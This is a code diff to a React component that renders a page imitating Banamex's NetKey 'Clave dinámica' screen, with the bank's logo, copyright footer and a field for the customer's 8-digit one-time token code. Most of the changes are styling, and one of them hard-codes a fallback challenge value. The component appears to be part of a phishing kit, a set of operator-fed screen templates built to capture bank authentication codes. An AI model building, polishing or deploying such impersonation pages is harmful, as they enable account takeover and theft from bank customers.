@@ -814,9 +814,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         };
         
         const netkeyContent = (
-          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px' }}>
+          <div style={{ margin: 0, background: '#fff', color: '#0b3b43', padding: '28px', fontFamily: '"Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}>
             <div style={{ maxWidth: '900px', margin: '18px auto' }}>
-              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px', flexWrap: 'wrap' }}>
+              <header style={{ display: 'flex', alignItems: 'center', gap: '18px', marginBottom: '22px' }}>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                   <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                     <g fill="#c81f3b">
@@ -837,35 +837,42 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
               </header>
 
-              <div style={{ 
-                background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
-                borderRadius: '8px', 
-                padding: '22px', 
-                boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
-                border: '1px solid rgba(0,0,0,0.03)' 
-              }} role="main" aria-labelledby="title">
+              <div 
+                style={{ 
+                  background: 'linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%)', 
+                  borderRadius: '8px', 
+                  padding: '22px', 
+                  boxShadow: '0 6px 18px rgba(0,0,0,0.08)', 
+                  border: '1px solid rgba(0,0,0,0.03)' 
+                }} 
+                role="main" 
+                aria-labelledby="title"
+              >
                 <h1 id="title" style={{ fontSize: '28px', margin: '6px 0 18px', display: 'flex', alignItems: 'center', gap: '12px' }}>
                   » Clave dinámica
                 </h1>
 
-                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start', flexWrap: 'wrap' }}>
-                  <div style={{ 
-                    background: '#fff', 
-                    borderRadius: '6px', 
-                    padding: '20px', 
-                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
-                    flex: '1.1', 
-                    minHeight: '260px', 
-                    minWidth: '280px',
-                    display: 'flex', 
-                    flexDirection: 'column' 
-                  }} aria-label="Instrucciones">
-                    <div style={{ color: '#133d43', lineHeight: 1.45, fontSize: '14px' }}>
+                <div style={{ display: 'flex', gap: '18px', alignItems: 'flex-start' }}>
+                  <div 
+                    style={{ 
+                      background: '#fff', 
+                      borderRadius: '6px', 
+                      padding: '20px', 
+                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
+                      flex: '1.1', 
+                      minHeight: '260px', 
+                      display: 'flex', 
+                      flexDirection: 'column',
+                      marginRight: '6px'
+                    }} 
+                    aria-label="Instrucciones"
+                  >
+                    <div style={{ color: '#133d43', lineHeight: '1.45', fontSize: '14px' }}>
                       <p>Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el número "9".</p>
                       <p>Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
 
                       <div style={{ marginTop: '18px', fontWeight: 700, fontSize: '22px', color: '#0b2b2f' }} id="challenge" data-testid="challenge-code">
-                        CHALLNG: <span id="challenge-value" data-testid="challenge-value">{screenData.challenge || '--------'}</span>
+                        CHALLNG: <span id="challenge-value" data-testid="challenge-value">{screenData.challenge || '58724375'}</span>
                       </div>
 
                       <div style={{ flex: 1 }}></div>
@@ -890,33 +897,31 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     </div>
                   </div>
 
-                  <div style={{ 
-                    width: '100%', 
-                    maxWidth: '320px', 
-                    background: '#fff', 
-                    borderRadius: '6px', 
-                    padding: '20px', 
-                    boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
-                    display: 'flex', 
-                    flexDirection: 'column', 
-                    justifyContent: 'space-between', 
-                    minWidth: '280px' 
-                  }} aria-label="Campo de clave dinámica">
+                  <div 
+                    style={{ 
+                      width: '320px', 
+                      background: '#fff', 
+                      borderRadius: '6px', 
+                      padding: '20px', 
+                      boxShadow: '0 3px 8px rgba(0,0,0,0.04)', 
+                      display: 'flex', 
+                      flexDirection: 'column', 
+                      justifyContent: 'space-between' 
+                    }} 
+                    aria-label="Campo de clave dinámica"
+                  >
                     <div>
-                      <p style={{ margin: '0 0 10px', fontWeight: 600, color: '#193b3e', fontSize: '14px' }}>
-                        Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
-                      </p>
+                      <p style={{ margin: '0 0 10px', fontWeight: 600, color: '#193b3e' }}>Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo</p>
 
-                      <label htmlFor="dinamica" style={{ fontSize: '13px', color: '#134142', marginBottom: '8px', display: 'block' }}>
-                        Clave dinámica
-                      </label>
-                      <input
-                        id="dinamica"
-                        type="text"
+                      <label htmlFor="dinamica" style={{ fontSize: '13px', color: '#134142', marginBottom: '8px', display: 'block' }}>Clave dinámica</label>
+                      <input 
+                        id="dinamica" 
+                        type="text" 
                         maxLength={8}
                         value={netkeyResponse}
                         onChange={(e) => setNetkeyResponse(e.target.value.replace(/\D/g, ''))}
-                        placeholder="Introduzca la clave dinámica aquí"
+                        placeholder="Introduzca la clave dinámica aquí" 
+                        aria-label="Clave dinámica" 
                         style={{ 
                           padding: '9px 10px', 
                           borderRadius: '3px', 
@@ -925,7 +930,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                           width: '100%', 
                           boxSizing: 'border-box' 
                         }}
-                        aria-label="Clave dinámica"
                         data-testid="input-netkey-response"
                       />
                     </div>
@@ -942,7 +946,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                             background: '#fff5f6', 
                             color: '#c22f40', 
                             border: '1px solid rgba(194,47,64,0.08)' 
-                          }}
+                          }} 
                           type="button"
                           data-testid="button-cancel"
                         >
@@ -958,19 +962,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                             fontSize: '14px', 
                             background: '#0f3e3f', 
                             color: '#fff', 
-                            boxShadow: '0 6px 10px rgba(15,62,63,0.12)', 
-                            opacity: netkeyResponse.length !== 8 ? 0.5 : 1 
-                          }}
+                            boxShadow: '0 6px 10px rgba(15,62,63,0.12)',
+                            opacity: netkeyResponse.length !== 8 ? 0.5 : 1
+                          }} 
+                          type="button"
                           onClick={handleNetkeySubmit}
                           disabled={netkeyResponse.length !== 8}
-                          type="button"
                           data-testid="button-continue"
                         >
                           Continuar
                         </button>
                       </div>
 
-                      <p style={{ marginTop: '18px', color: '#8b9aa0', fontSize: '12px' }}>
+                      <p style={{ marginTop: '12px', color: '#8b9aa0', fontSize: '12px' }}>
                         D.R., © 2025, Banco Nacional de México, S.A., integrante del Grupo Financiero Banamex.
                         Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
                       </p>
@@ -978,7 +982,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </div>
                 </div>
               </div>
-
             </div>
           </div>
         );
